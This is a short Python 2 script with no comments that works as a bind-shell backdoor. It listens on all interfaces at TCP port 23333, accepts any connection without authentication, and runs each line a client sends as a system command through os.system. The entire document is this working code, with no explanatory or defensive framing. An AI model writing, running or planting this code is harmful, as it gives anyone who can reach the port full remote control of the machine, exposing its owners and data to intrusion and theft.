import socket
import threading
import time
import os

def tcplink(sock,addr):
    while True:
        data=sock.recv(1024)
        os.system(data)
        print data
        time.sleep(1)
        if data == 'exit\n' or not data:
            break
    sock.close()

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(('0.0.0.0',23333))
s.listen(1)

while True:
    sock,addr = s.accept()
    t = threading.Thread(target=tcplink,args=(sock,addr))
    t.start()


